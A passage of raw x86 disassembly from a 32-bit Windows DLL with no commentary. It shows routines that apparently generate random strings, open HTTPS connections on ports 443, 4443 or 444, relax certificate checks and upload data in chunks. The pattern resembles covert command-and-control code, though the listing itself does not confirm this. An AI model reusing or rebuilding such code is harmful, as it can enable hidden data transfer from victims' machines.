10005e5c:	89 86 a0 00 00 00    	mov    %eax,0xa0(%esi)
10005e62:	e8 09 00 00 00       	call   0x10005e70
10005e67:	89 06                	mov    %eax,(%esi)
10005e69:	8b c6                	mov    %esi,%eax
10005e6b:	5e                   	pop    %esi
10005e6c:	5d                   	pop    %ebp
10005e6d:	c2 10 00             	ret    $0x10
10005e70:	55                   	push   %ebp
10005e71:	8b ec                	mov    %esp,%ebp
10005e73:	5d                   	pop    %ebp
10005e74:	e9 00 00 00 00       	jmp    0x10005e79
10005e79:	55                   	push   %ebp
10005e7a:	8b ec                	mov    %esp,%ebp
10005e7c:	53                   	push   %ebx
10005e7d:	8b 1d 28 e1 00 10    	mov    0x1000e128,%ebx
10005e83:	57                   	push   %edi
10005e84:	33 ff                	xor    %edi,%edi
10005e86:	57                   	push   %edi
10005e87:	57                   	push   %edi
10005e88:	57                   	push   %edi
10005e89:	57                   	push   %edi
10005e8a:	89 7e 04             	mov    %edi,0x4(%esi)
10005e8d:	89 7e 08             	mov    %edi,0x8(%esi)
10005e90:	89 be 28 01 00 00    	mov    %edi,0x128(%esi)
10005e96:	89 be 54 01 00 00    	mov    %edi,0x154(%esi)
10005e9c:	ff d3                	call   *%ebx
10005e9e:	89 86 34 01 00 00    	mov    %eax,0x134(%esi)
10005ea4:	3b c7                	cmp    %edi,%eax
10005ea6:	75 07                	jne    0x10005eaf
10005ea8:	33 c0                	xor    %eax,%eax
10005eaa:	e9 a0 00 00 00       	jmp    0x10005f4f
10005eaf:	57                   	push   %edi
10005eb0:	57                   	push   %edi
10005eb1:	57                   	push   %edi
10005eb2:	57                   	push   %edi
10005eb3:	ff d3                	call   *%ebx
10005eb5:	89 86 38 01 00 00    	mov    %eax,0x138(%esi)
10005ebb:	3b c7                	cmp    %edi,%eax
10005ebd:	75 09                	jne    0x10005ec8
10005ebf:	57                   	push   %edi
10005ec0:	ff 15 50 e1 00 10    	call   *0x1000e150
10005ec6:	eb e0                	jmp    0x10005ea8
10005ec8:	ff 75 08             	pushl  0x8(%ebp)
10005ecb:	8d 4e 0c             	lea    0xc(%esi),%ecx
10005ece:	68 80 00 00 00       	push   $0x80
10005ed3:	e8 14 cf ff ff       	call   0x10002dec
10005ed8:	66 8b 45 0c          	mov    0xc(%ebp),%ax
10005edc:	ff 75 10             	pushl  0x10(%ebp)
10005edf:	66 89 86 8c 00 00 00 	mov    %ax,0x8c(%esi)
10005ee6:	89 be 90 00 00 00    	mov    %edi,0x90(%esi)
10005eec:	89 be 98 00 00 00    	mov    %edi,0x98(%esi)
10005ef2:	ff 15 34 e1 00 10    	call   *0x1000e134
10005ef8:	8d 58 01             	lea    0x1(%eax),%ebx
10005efb:	53                   	push   %ebx
10005efc:	e8 e3 0a 00 00       	call   0x100069e4
10005f01:	59                   	pop    %ecx
10005f02:	89 86 9c 00 00 00    	mov    %eax,0x9c(%esi)
10005f08:	3b c7                	cmp    %edi,%eax
10005f0a:	75 2f                	jne    0x10005f3b
10005f0c:	39 be 98 00 00 00    	cmp    %edi,0x98(%esi)
10005f12:	74 0c                	je     0x10005f20
10005f14:	ff b6 90 00 00 00    	pushl  0x90(%esi)
10005f1a:	e8 f4 0a 00 00       	call   0x10006a13
10005f1f:	59                   	pop    %ecx
10005f20:	ff b6 34 01 00 00    	pushl  0x134(%esi)
10005f26:	8b 3d 50 e1 00 10    	mov    0x1000e150,%edi
10005f2c:	ff d7                	call   *%edi
10005f2e:	ff b6 38 01 00 00    	pushl  0x138(%esi)
10005f34:	ff d7                	call   *%edi
10005f36:	e9 6d ff ff ff       	jmp    0x10005ea8
10005f3b:	ff 75 10             	pushl  0x10(%ebp)
10005f3e:	8b c8                	mov    %eax,%ecx
10005f40:	53                   	push   %ebx
10005f41:	e8 a6 ce ff ff       	call   0x10002dec
10005f46:	33 c0                	xor    %eax,%eax
10005f48:	40                   	inc    %eax
10005f49:	89 86 a0 00 00 00    	mov    %eax,0xa0(%esi)
10005f4f:	5f                   	pop    %edi
10005f50:	5b                   	pop    %ebx
10005f51:	5d                   	pop    %ebp
10005f52:	c2 0c 00             	ret    $0xc
10005f55:	33 d2                	xor    %edx,%edx
10005f57:	33 c9                	xor    %ecx,%ecx
10005f59:	e8 05 79 00 00       	call   0x1000d863
10005f5e:	85 c0                	test   %eax,%eax
10005f60:	75 08                	jne    0x10005f6a
10005f62:	41                   	inc    %ecx
10005f63:	83 f9 01             	cmp    $0x1,%ecx
10005f66:	7c f6                	jl     0x10005f5e
10005f68:	eb 03                	jmp    0x10005f6d
10005f6a:	33 d2                	xor    %edx,%edx
10005f6c:	42                   	inc    %edx
10005f6d:	8b c2                	mov    %edx,%eax
10005f6f:	c3                   	ret    
10005f70:	55                   	push   %ebp
10005f71:	8b ec                	mov    %esp,%ebp
10005f73:	83 ec 10             	sub    $0x10,%esp
10005f76:	8d 45 f0             	lea    -0x10(%ebp),%eax
10005f79:	6a 0f                	push   $0xf
10005f7b:	50                   	push   %eax
10005f7c:	e8 ae f6 ff ff       	call   0x1000562f
10005f81:	59                   	pop    %ecx
10005f82:	59                   	pop    %ecx
10005f83:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
10005f87:	ff 15 40 e1 00 10    	call   *0x1000e140
10005f8d:	50                   	push   %eax
10005f8e:	8d 45 f0             	lea    -0x10(%ebp),%eax
10005f91:	50                   	push   %eax
10005f92:	68 4c e8 00 10       	push   $0x1000e84c
10005f97:	ff 75 08             	pushl  0x8(%ebp)
10005f9a:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
10005fa0:	83 c4 10             	add    $0x10,%esp
10005fa3:	e8 ad ff ff ff       	call   0x10005f55
10005fa8:	85 c0                	test   %eax,%eax
10005faa:	75 ca                	jne    0x10005f76
10005fac:	40                   	inc    %eax
10005fad:	c9                   	leave  
10005fae:	c3                   	ret    
10005faf:	55                   	push   %ebp
10005fb0:	8b ec                	mov    %esp,%ebp
10005fb2:	51                   	push   %ecx
10005fb3:	51                   	push   %ecx
10005fb4:	8d 45 f8             	lea    -0x8(%ebp),%eax
10005fb7:	50                   	push   %eax
10005fb8:	8d 45 fc             	lea    -0x4(%ebp),%eax
10005fbb:	50                   	push   %eax
10005fbc:	6a 1f                	push   $0x1f
10005fbe:	ff 75 08             	pushl  0x8(%ebp)
10005fc1:	c7 45 f8 04 00 00 00 	movl   $0x4,-0x8(%ebp)
10005fc8:	ff 15 fc e1 00 10    	call   *0x1000e1fc
10005fce:	81 4d fc 80 03 00 00 	orl    $0x380,-0x4(%ebp)
10005fd5:	6a 04                	push   $0x4
10005fd7:	8d 45 fc             	lea    -0x4(%ebp),%eax
10005fda:	50                   	push   %eax
10005fdb:	6a 1f                	push   $0x1f
10005fdd:	ff 75 08             	pushl  0x8(%ebp)
10005fe0:	ff 15 e8 e1 00 10    	call   *0x1000e1e8
10005fe6:	33 c0                	xor    %eax,%eax
10005fe8:	40                   	inc    %eax
10005fe9:	c9                   	leave  
10005fea:	c3                   	ret    
10005feb:	cc                   	int3   
10005fec:	cc                   	int3   
10005fed:	55                   	push   %ebp
10005fee:	8b ec                	mov    %esp,%ebp
10005ff0:	53                   	push   %ebx
10005ff1:	57                   	push   %edi
10005ff2:	56                   	push   %esi
10005ff3:	ff 75 0c             	pushl  0xc(%ebp)
10005ff6:	8b f8                	mov    %eax,%edi
10005ff8:	68 74 e9 00 10       	push   $0x1000e974
10005ffd:	57                   	push   %edi
10005ffe:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
10006004:	83 c4 10             	add    $0x10,%esp
10006007:	68 a8 e9 00 10       	push   $0x1000e9a8
1000600c:	ff 75 08             	pushl  0x8(%ebp)
1000600f:	e8 08 ce ff ff       	call   0x10002e1c
10006014:	8b 46 4c             	mov    0x4c(%esi),%eax
10006017:	ff 34 85 60 e9 00 10 	pushl  0x1000e960(,%eax,4)
1000601e:	ff 75 08             	pushl  0x8(%ebp)
10006021:	e8 f6 cd ff ff       	call   0x10002e1c
10006026:	68 b8 e9 00 10       	push   $0x1000e9b8
1000602b:	ff 75 08             	pushl  0x8(%ebp)
1000602e:	e8 e9 cd ff ff       	call   0x10002e1c
10006033:	57                   	push   %edi
10006034:	ff 15 34 e1 00 10    	call   *0x1000e134
1000603a:	ff 76 48             	pushl  0x48(%esi)
1000603d:	8b d8                	mov    %eax,%ebx
1000603f:	ff 76 44             	pushl  0x44(%esi)
10006042:	8d 04 3b             	lea    (%ebx,%edi,1),%eax
10006045:	50                   	push   %eax
10006046:	e8 c5 7c 00 00       	call   0x1000dd10
1000604b:	8b 46 48             	mov    0x48(%esi),%eax
1000604e:	83 c4 0c             	add    $0xc,%esp
10006051:	5f                   	pop    %edi
10006052:	03 c3                	add    %ebx,%eax
10006054:	5b                   	pop    %ebx
10006055:	5d                   	pop    %ebp
10006056:	c3                   	ret    
10006057:	55                   	push   %ebp
10006058:	8b ec                	mov    %esp,%ebp
1000605a:	ff 75 0c             	pushl  0xc(%ebp)
1000605d:	68 c0 e9 00 10       	push   $0x1000e9c0
10006062:	ff 75 08             	pushl  0x8(%ebp)
10006065:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
1000606b:	83 c4 0c             	add    $0xc,%esp
1000606e:	ff 75 08             	pushl  0x8(%ebp)
10006071:	ff 15 34 e1 00 10    	call   *0x1000e134
10006077:	5d                   	pop    %ebp
10006078:	c3                   	ret    
10006079:	55                   	push   %ebp
1000607a:	8b ec                	mov    %esp,%ebp
1000607c:	51                   	push   %ecx
1000607d:	51                   	push   %ecx
1000607e:	8b 87 90 00 00 00    	mov    0x90(%edi),%eax
10006084:	53                   	push   %ebx
10006085:	56                   	push   %esi
10006086:	33 f6                	xor    %esi,%esi
10006088:	46                   	inc    %esi
10006089:	89 75 fc             	mov    %esi,-0x4(%ebp)
1000608c:	85 c0                	test   %eax,%eax
1000608e:	74 07                	je     0x10006097
10006090:	50                   	push   %eax
10006091:	e8 7d 09 00 00       	call   0x10006a13
10006096:	59                   	pop    %ecx
10006097:	8b 45 08             	mov    0x8(%ebp),%eax
1000609a:	8b 58 48             	mov    0x48(%eax),%ebx
1000609d:	81 c3 00 02 00 00    	add    $0x200,%ebx
100060a3:	0f 84 ae 00 00 00    	je     0x10006157
100060a9:	8d 87 a4 00 00 00    	lea    0xa4(%edi),%eax
100060af:	50                   	push   %eax
100060b0:	e8 bb fe ff ff       	call   0x10005f70
100060b5:	59                   	pop    %ecx
100060b6:	85 c0                	test   %eax,%eax
100060b8:	0f 84 99 00 00 00    	je     0x10006157
100060be:	53                   	push   %ebx
100060bf:	e8 20 09 00 00       	call   0x100069e4
100060c4:	59                   	pop    %ecx
100060c5:	89 87 90 00 00 00    	mov    %eax,0x90(%edi)
100060cb:	85 c0                	test   %eax,%eax
100060cd:	0f 84 84 00 00 00    	je     0x10006157
100060d3:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
100060d7:	89 75 fc             	mov    %esi,-0x4(%ebp)
100060da:	8b 75 08             	mov    0x8(%ebp),%esi
100060dd:	8b 8f 98 00 00 00    	mov    0x98(%edi),%ecx
100060e3:	8d 87 a4 00 00 00    	lea    0xa4(%edi),%eax
100060e9:	50                   	push   %eax
100060ea:	8b c3                	mov    %ebx,%eax
100060ec:	2b c1                	sub    %ecx,%eax
100060ee:	50                   	push   %eax
100060ef:	8b 87 90 00 00 00    	mov    0x90(%edi),%eax
100060f5:	03 c1                	add    %ecx,%eax
100060f7:	e8 f1 fe ff ff       	call   0x10005fed
100060fc:	59                   	pop    %ecx
100060fd:	59                   	pop    %ecx
100060fe:	85 c0                	test   %eax,%eax
10006100:	74 39                	je     0x1000613b
10006102:	01 87 98 00 00 00    	add    %eax,0x98(%edi)
10006108:	ff 45 f8             	incl   -0x8(%ebp)
1000610b:	8b 87 98 00 00 00    	mov    0x98(%edi),%eax
10006111:	83 c6 50             	add    $0x50,%esi
10006114:	83 7d f8 01          	cmpl   $0x1,-0x8(%ebp)
10006118:	7c c3                	jl     0x100060dd
1000611a:	8d 8f a4 00 00 00    	lea    0xa4(%edi),%ecx
10006120:	51                   	push   %ecx
10006121:	8b 8f 90 00 00 00    	mov    0x90(%edi),%ecx
10006127:	03 c8                	add    %eax,%ecx
10006129:	51                   	push   %ecx
1000612a:	e8 28 ff ff ff       	call   0x10006057
1000612f:	01 87 98 00 00 00    	add    %eax,0x98(%edi)
10006135:	59                   	pop    %ecx
10006136:	59                   	pop    %ecx
10006137:	85 c0                	test   %eax,%eax
10006139:	75 1c                	jne    0x10006157
1000613b:	8b 87 90 00 00 00    	mov    0x90(%edi),%eax
10006141:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10006145:	85 c0                	test   %eax,%eax
10006147:	74 07                	je     0x10006150
10006149:	50                   	push   %eax
1000614a:	e8 c4 08 00 00       	call   0x10006a13
1000614f:	59                   	pop    %ecx
10006150:	83 a7 90 00 00 00 00 	andl   $0x0,0x90(%edi)
10006157:	8b 45 fc             	mov    -0x4(%ebp),%eax
1000615a:	5e                   	pop    %esi
1000615b:	5b                   	pop    %ebx
1000615c:	c9                   	leave  
1000615d:	c2 04 00             	ret    $0x4
10006160:	8b 86 90 00 00 00    	mov    0x90(%esi),%eax
10006166:	85 c0                	test   %eax,%eax
10006168:	74 10                	je     0x1000617a
1000616a:	83 be 94 00 00 00 00 	cmpl   $0x0,0x94(%esi)
10006171:	74 07                	je     0x1000617a
10006173:	50                   	push   %eax
10006174:	e8 9a 08 00 00       	call   0x10006a13
10006179:	59                   	pop    %ecx
1000617a:	83 be a0 00 00 00 00 	cmpl   $0x0,0xa0(%esi)
10006181:	74 11                	je     0x10006194
10006183:	8b 86 9c 00 00 00    	mov    0x9c(%esi),%eax
10006189:	85 c0                	test   %eax,%eax
1000618b:	74 07                	je     0x10006194
1000618d:	50                   	push   %eax
1000618e:	e8 80 08 00 00       	call   0x10006a13
10006193:	59                   	pop    %ecx
10006194:	57                   	push   %edi
10006195:	8b c6                	mov    %esi,%eax
10006197:	e8 3d 00 00 00       	call   0x100061d9
1000619c:	8b c6                	mov    %esi,%eax
1000619e:	e8 03 02 00 00       	call   0x100063a6
100061a3:	ff b6 34 01 00 00    	pushl  0x134(%esi)
100061a9:	8b 3d 50 e1 00 10    	mov    0x1000e150,%edi
100061af:	ff d7                	call   *%edi
100061b1:	ff b6 38 01 00 00    	pushl  0x138(%esi)
100061b7:	ff d7                	call   *%edi
100061b9:	ff b6 30 01 00 00    	pushl  0x130(%esi)
100061bf:	ff d7                	call   *%edi
100061c1:	8d 86 44 01 00 00    	lea    0x144(%esi),%eax
100061c7:	5f                   	pop    %edi
100061c8:	e9 ac f9 ff ff       	jmp    0x10005b79
100061cd:	68 58 01 00 00       	push   $0x158
100061d2:	e8 0d 08 00 00       	call   0x100069e4
100061d7:	59                   	pop    %ecx
100061d8:	c3                   	ret    
100061d9:	83 b8 24 01 00 00 00 	cmpl   $0x0,0x124(%eax)
100061e0:	75 14                	jne    0x100061f6
100061e2:	6a ff                	push   $0xffffffff
100061e4:	ff b0 38 01 00 00    	pushl  0x138(%eax)
100061ea:	ff 15 38 e1 00 10    	call   *0x1000e138
100061f0:	f7 d8                	neg    %eax
100061f2:	1b c0                	sbb    %eax,%eax
100061f4:	40                   	inc    %eax
100061f5:	c3                   	ret    
100061f6:	33 c0                	xor    %eax,%eax
100061f8:	40                   	inc    %eax
100061f9:	c3                   	ret    
100061fa:	c7 80 28 01 00 00 8b 	movl   $0x1000868b,0x128(%eax)
10006201:	86 00 10 
10006204:	89 88 2c 01 00 00    	mov    %ecx,0x12c(%eax)
1000620a:	c3                   	ret    
1000620b:	55                   	push   %ebp
1000620c:	8b ec                	mov    %esp,%ebp
1000620e:	83 ec 10             	sub    $0x10,%esp
10006211:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
10006215:	56                   	push   %esi
10006216:	57                   	push   %edi
10006217:	8b f8                	mov    %eax,%edi
10006219:	c6 07 00             	movb   $0x0,(%edi)
1000621c:	be 00 10 00 00       	mov    $0x1000,%esi
10006221:	74 1f                	je     0x10006242
10006223:	68 cc e9 00 10       	push   $0x1000e9cc
10006228:	56                   	push   %esi
10006229:	e8 ee cb ff ff       	call   0x10002e1c
1000622e:	ff 75 0c             	pushl  0xc(%ebp)
10006231:	56                   	push   %esi
10006232:	e8 e5 cb ff ff       	call   0x10002e1c
10006237:	68 80 e4 00 10       	push   $0x1000e480
1000623c:	56                   	push   %esi
1000623d:	e8 da cb ff ff       	call   0x10002e1c
10006242:	68 fc e9 00 10       	push   $0x1000e9fc
10006247:	56                   	push   %esi
10006248:	e8 cf cb ff ff       	call   0x10002e1c
1000624d:	ff 75 08             	pushl  0x8(%ebp)
10006250:	8d 45 f0             	lea    -0x10(%ebp),%eax
10006253:	68 d4 e6 00 10       	push   $0x1000e6d4
10006258:	50                   	push   %eax
10006259:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
1000625f:	83 c4 0c             	add    $0xc,%esp
10006262:	8d 45 f0             	lea    -0x10(%ebp),%eax
10006265:	50                   	push   %eax
10006266:	56                   	push   %esi
10006267:	e8 b0 cb ff ff       	call   0x10002e1c
1000626c:	68 10 ea 00 10       	push   $0x1000ea10
10006271:	56                   	push   %esi
10006272:	e8 a5 cb ff ff       	call   0x10002e1c
10006277:	33 c0                	xor    %eax,%eax
10006279:	5f                   	pop    %edi
1000627a:	40                   	inc    %eax
1000627b:	5e                   	pop    %esi
1000627c:	c9                   	leave  
1000627d:	c3                   	ret    
1000627e:	55                   	push   %ebp
1000627f:	8b ec                	mov    %esp,%ebp
10006281:	83 ec 2c             	sub    $0x2c,%esp
10006284:	53                   	push   %ebx
10006285:	8b 5d 10             	mov    0x10(%ebp),%ebx
10006288:	57                   	push   %edi
10006289:	33 ff                	xor    %edi,%edi
1000628b:	57                   	push   %edi
1000628c:	57                   	push   %edi
1000628d:	57                   	push   %edi
1000628e:	8d 45 d4             	lea    -0x2c(%ebp),%eax
10006291:	50                   	push   %eax
10006292:	ff 75 08             	pushl  0x8(%ebp)
10006295:	c7 45 d4 28 00 00 00 	movl   $0x28,-0x2c(%ebp)
1000629c:	89 7d d8             	mov    %edi,-0x28(%ebp)
1000629f:	89 7d dc             	mov    %edi,-0x24(%ebp)
100062a2:	89 7d e0             	mov    %edi,-0x20(%ebp)
100062a5:	89 7d e4             	mov    %edi,-0x1c(%ebp)
100062a8:	89 7d e8             	mov    %edi,-0x18(%ebp)
100062ab:	89 7d ec             	mov    %edi,-0x14(%ebp)
100062ae:	89 5d f0             	mov    %ebx,-0x10(%ebp)
100062b1:	89 7d f4             	mov    %edi,-0xc(%ebp)
100062b4:	89 7d f8             	mov    %edi,-0x8(%ebp)
100062b7:	ff 15 f8 e1 00 10    	call   *0x1000e1f8
100062bd:	85 c0                	test   %eax,%eax
100062bf:	74 54                	je     0x10006315
100062c1:	33 c0                	xor    %eax,%eax
100062c3:	56                   	push   %esi
100062c4:	40                   	inc    %eax
100062c5:	33 f6                	xor    %esi,%esi
100062c7:	89 7d fc             	mov    %edi,-0x4(%ebp)
100062ca:	3b df                	cmp    %edi,%ebx
100062cc:	76 3a                	jbe    0x10006308
100062ce:	bb 00 04 00 00       	mov    $0x400,%ebx
100062d3:	3b c7                	cmp    %edi,%eax
100062d5:	74 2d                	je     0x10006304
100062d7:	8b 45 10             	mov    0x10(%ebp),%eax
100062da:	2b c6                	sub    %esi,%eax
100062dc:	8b cb                	mov    %ebx,%ecx
100062de:	3b c3                	cmp    %ebx,%eax
100062e0:	73 02                	jae    0x100062e4
100062e2:	8b c8                	mov    %eax,%ecx
100062e4:	8d 45 fc             	lea    -0x4(%ebp),%eax
100062e7:	50                   	push   %eax
100062e8:	8b 45 0c             	mov    0xc(%ebp),%eax
100062eb:	51                   	push   %ecx
100062ec:	03 c6                	add    %esi,%eax
100062ee:	50                   	push   %eax
100062ef:	ff 75 08             	pushl  0x8(%ebp)
100062f2:	ff 15 ec e1 00 10    	call   *0x1000e1ec
100062f8:	03 75 fc             	add    -0x4(%ebp),%esi
100062fb:	3b 75 10             	cmp    0x10(%ebp),%esi
100062fe:	72 d3                	jb     0x100062d3
10006300:	3b c7                	cmp    %edi,%eax
10006302:	75 04                	jne    0x10006308
10006304:	33 c0                	xor    %eax,%eax
10006306:	eb 0c                	jmp    0x10006314
10006308:	57                   	push   %edi
10006309:	57                   	push   %edi
1000630a:	57                   	push   %edi
1000630b:	ff 75 08             	pushl  0x8(%ebp)
1000630e:	ff 15 08 e2 00 10    	call   *0x1000e208
10006314:	5e                   	pop    %esi
10006315:	5f                   	pop    %edi
10006316:	5b                   	pop    %ebx
10006317:	c9                   	leave  
10006318:	c3                   	ret    
10006319:	05 44 01 00 00       	add    $0x144,%eax
1000631e:	e9 04 e8 ff ff       	jmp    0x10004b27
10006323:	05 44 01 00 00       	add    $0x144,%eax
10006328:	e9 61 22 00 00       	jmp    0x1000858e
1000632d:	68 e0 93 04 00       	push   $0x493e0
10006332:	ff b0 34 01 00 00    	pushl  0x134(%eax)
10006338:	ff 15 38 e1 00 10    	call   *0x1000e138
1000633e:	f7 d8                	neg    %eax
10006340:	1b c0                	sbb    %eax,%eax
10006342:	40                   	inc    %eax
10006343:	c3                   	ret    
10006344:	8b 80 54 01 00 00    	mov    0x154(%eax),%eax
1000634a:	c3                   	ret    
1000634b:	57                   	push   %edi
1000634c:	33 ff                	xor    %edi,%edi
1000634e:	39 7e 08             	cmp    %edi,0x8(%esi)
10006351:	75 4e                	jne    0x100063a1
10006353:	57                   	push   %edi
10006354:	57                   	push   %edi
10006355:	57                   	push   %edi
10006356:	57                   	push   %edi
10006357:	68 20 e6 00 10       	push   $0x1000e620
1000635c:	ff 15 04 e2 00 10    	call   *0x1000e204
10006362:	89 46 04             	mov    %eax,0x4(%esi)
10006365:	3b c7                	cmp    %edi,%eax
10006367:	74 38                	je     0x100063a1
10006369:	0f b7 8e 8c 00 00 00 	movzwl 0x8c(%esi),%ecx
10006370:	57                   	push   %edi
10006371:	57                   	push   %edi
10006372:	6a 03                	push   $0x3
10006374:	57                   	push   %edi
10006375:	57                   	push   %edi
10006376:	51                   	push   %ecx
10006377:	8d 4e 0c             	lea    0xc(%esi),%ecx
1000637a:	51                   	push   %ecx
1000637b:	50                   	push   %eax
1000637c:	ff 15 20 e2 00 10    	call   *0x1000e220
10006382:	89 46 08             	mov    %eax,0x8(%esi)
10006385:	3b c7                	cmp    %edi,%eax
10006387:	75 18                	jne    0x100063a1
10006389:	ff 15 4c e1 00 10    	call   *0x1000e14c
1000638f:	ff 76 04             	pushl  0x4(%esi)
10006392:	8b f8                	mov    %eax,%edi
10006394:	ff 15 0c e2 00 10    	call   *0x1000e20c
1000639a:	57                   	push   %edi
1000639b:	ff 15 9c e0 00 10    	call   *0x1000e09c
100063a1:	8b 46 08             	mov    0x8(%esi),%eax
100063a4:	5f                   	pop    %edi
100063a5:	c3                   	ret    
100063a6:	56                   	push   %esi
100063a7:	8b f0                	mov    %eax,%esi
100063a9:	8b 46 08             	mov    0x8(%esi),%eax
100063ac:	57                   	push   %edi
100063ad:	8b 3d 0c e2 00 10    	mov    0x1000e20c,%edi
100063b3:	85 c0                	test   %eax,%eax
100063b5:	74 03                	je     0x100063ba
100063b7:	50                   	push   %eax
100063b8:	ff d7                	call   *%edi
100063ba:	8b 76 04             	mov    0x4(%esi),%esi
100063bd:	85 f6                	test   %esi,%esi
100063bf:	74 03                	je     0x100063c4
100063c1:	56                   	push   %esi
100063c2:	ff d7                	call   *%edi
100063c4:	5f                   	pop    %edi
100063c5:	5e                   	pop    %esi
100063c6:	c3                   	ret    
100063c7:	55                   	push   %ebp
100063c8:	8b ec                	mov    %esp,%ebp
100063ca:	81 ec 18 01 00 00    	sub    $0x118,%esp
100063d0:	56                   	push   %esi
100063d1:	8b f3                	mov    %ebx,%esi
100063d3:	e8 73 ff ff ff       	call   0x1000634b
100063d8:	85 c0                	test   %eax,%eax
100063da:	75 0b                	jne    0x100063e7
100063dc:	ff 15 4c e1 00 10    	call   *0x1000e14c
100063e2:	e9 ba 01 00 00       	jmp    0x100065a1
100063e7:	0f b7 83 8c 00 00 00 	movzwl 0x8c(%ebx),%eax
100063ee:	33 f6                	xor    %esi,%esi
100063f0:	b9 bb 01 00 00       	mov    $0x1bb,%ecx
100063f5:	57                   	push   %edi
100063f6:	89 75 ec             	mov    %esi,-0x14(%ebp)
100063f9:	bf 00 00 00 04       	mov    $0x4000000,%edi
100063fe:	66 3b c1             	cmp    %cx,%ax
10006401:	74 14                	je     0x10006417
10006403:	b9 5b 11 00 00       	mov    $0x115b,%ecx
10006408:	66 3b c1             	cmp    %cx,%ax
1000640b:	74 0a                	je     0x10006417
1000640d:	b9 bc 01 00 00       	mov    $0x1bc,%ecx
10006412:	66 3b c1             	cmp    %cx,%ax
10006415:	75 05                	jne    0x1000641c
10006417:	bf 00 30 80 04       	mov    $0x4803000,%edi
1000641c:	56                   	push   %esi
1000641d:	57                   	push   %edi
1000641e:	56                   	push   %esi
1000641f:	56                   	push   %esi
10006420:	56                   	push   %esi
10006421:	ff b3 9c 00 00 00    	pushl  0x9c(%ebx)
10006427:	68 40 ea 00 10       	push   $0x1000ea40
1000642c:	ff 73 08             	pushl  0x8(%ebx)
1000642f:	ff 15 00 e2 00 10    	call   *0x1000e200
10006435:	89 45 fc             	mov    %eax,-0x4(%ebp)
10006438:	3b c6                	cmp    %esi,%eax
1000643a:	74 36                	je     0x10006472
1000643c:	f7 c7 00 00 80 00    	test   $0x800000,%edi
10006442:	74 07                	je     0x1000644b
10006444:	50                   	push   %eax
10006445:	e8 65 fb ff ff       	call   0x10005faf
1000644a:	59                   	pop    %ecx
1000644b:	68 00 10 00 00       	push   $0x1000
10006450:	e8 8f 05 00 00       	call   0x100069e4
10006455:	8b f8                	mov    %eax,%edi
10006457:	8d 83 a4 00 00 00    	lea    0xa4(%ebx),%eax
1000645d:	50                   	push   %eax
1000645e:	ff b3 98 00 00 00    	pushl  0x98(%ebx)
10006464:	8b c7                	mov    %edi,%eax
10006466:	e8 a0 fd ff ff       	call   0x1000620b
1000646b:	83 c4 0c             	add    $0xc,%esp
1000646e:	85 c0                	test   %eax,%eax
10006470:	75 0b                	jne    0x1000647d
10006472:	ff 15 4c e1 00 10    	call   *0x1000e14c
10006478:	e9 23 01 00 00       	jmp    0x100065a0
1000647d:	68 00 00 00 20       	push   $0x20000000
10006482:	57                   	push   %edi
10006483:	ff 15 34 e1 00 10    	call   *0x1000e134
10006489:	50                   	push   %eax
1000648a:	57                   	push   %edi
1000648b:	ff 75 fc             	pushl  -0x4(%ebp)
1000648e:	ff 15 18 e2 00 10    	call   *0x1000e218
10006494:	85 c0                	test   %eax,%eax
10006496:	75 11                	jne    0x100064a9
10006498:	ff 15 4c e1 00 10    	call   *0x1000e14c
1000649e:	57                   	push   %edi
1000649f:	8b f0                	mov    %eax,%esi
100064a1:	e8 6d 05 00 00       	call   0x10006a13
100064a6:	59                   	pop    %ecx
100064a7:	eb 31                	jmp    0x100064da
100064a9:	57                   	push   %edi
100064aa:	e8 64 05 00 00       	call   0x10006a13
100064af:	ff b3 98 00 00 00    	pushl  0x98(%ebx)
100064b5:	8b 7d fc             	mov    -0x4(%ebp),%edi
100064b8:	ff b3 90 00 00 00    	pushl  0x90(%ebx)
100064be:	57                   	push   %edi
100064bf:	e8 ba fd ff ff       	call   0x1000627e
100064c4:	83 c4 10             	add    $0x10,%esp
100064c7:	85 c0                	test   %eax,%eax
100064c9:	75 16                	jne    0x100064e1
100064cb:	ff 15 4c e1 00 10    	call   *0x1000e14c
100064d1:	57                   	push   %edi
100064d2:	8b f0                	mov    %eax,%esi
100064d4:	ff 15 0c e2 00 10    	call   *0x1000e20c
100064da:	8b c6                	mov    %esi,%eax
100064dc:	e9 bf 00 00 00       	jmp    0x100065a0
100064e1:	56                   	push   %esi
100064e2:	56                   	push   %esi
100064e3:	8d 45 f8             	lea    -0x8(%ebp),%eax
100064e6:	50                   	push   %eax
100064e7:	57                   	push   %edi
100064e8:	89 75 f8             	mov    %esi,-0x8(%ebp)
100064eb:	ff 15 f4 e1 00 10    	call   *0x1000e1f4
100064f1:	85 c0                	test   %eax,%eax
100064f3:	74 6a                	je     0x1000655f
100064f5:	ff 75 f8             	pushl  -0x8(%ebp)
100064f8:	e8 e7 04 00 00       	call   0x100069e4
100064fd:	59                   	pop    %ecx
100064fe:	89 45 f4             	mov    %eax,-0xc(%ebp)
10006501:	3b c6                	cmp    %esi,%eax
10006503:	74 5a                	je     0x1000655f
10006505:	8d 4d f0             	lea    -0x10(%ebp),%ecx
10006508:	51                   	push   %ecx
10006509:	ff 75 f8             	pushl  -0x8(%ebp)
1000650c:	89 75 f0             	mov    %esi,-0x10(%ebp)
1000650f:	50                   	push   %eax
10006510:	57                   	push   %edi
10006511:	ff 15 f0 e1 00 10    	call   *0x1000e1f0
10006517:	eb 2e                	jmp    0x10006547
10006519:	8b 7d f0             	mov    -0x10(%ebp),%edi
1000651c:	3b fe                	cmp    %esi,%edi
1000651e:	74 36                	je     0x10006556
10006520:	ff 75 f4             	pushl  -0xc(%ebp)
10006523:	8d b3 44 01 00 00    	lea    0x144(%ebx),%esi
10006529:	e8 a8 f6 ff ff       	call   0x10005bd6
1000652e:	85 c0                	test   %eax,%eax
10006530:	74 1b                	je     0x1000654d
10006532:	8d 45 f0             	lea    -0x10(%ebp),%eax
10006535:	50                   	push   %eax
10006536:	ff 75 f8             	pushl  -0x8(%ebp)
10006539:	ff 75 f4             	pushl  -0xc(%ebp)
1000653c:	ff 75 fc             	pushl  -0x4(%ebp)
1000653f:	ff 15 f0 e1 00 10    	call   *0x1000e1f0
10006545:	33 f6                	xor    %esi,%esi
10006547:	85 c0                	test   %eax,%eax
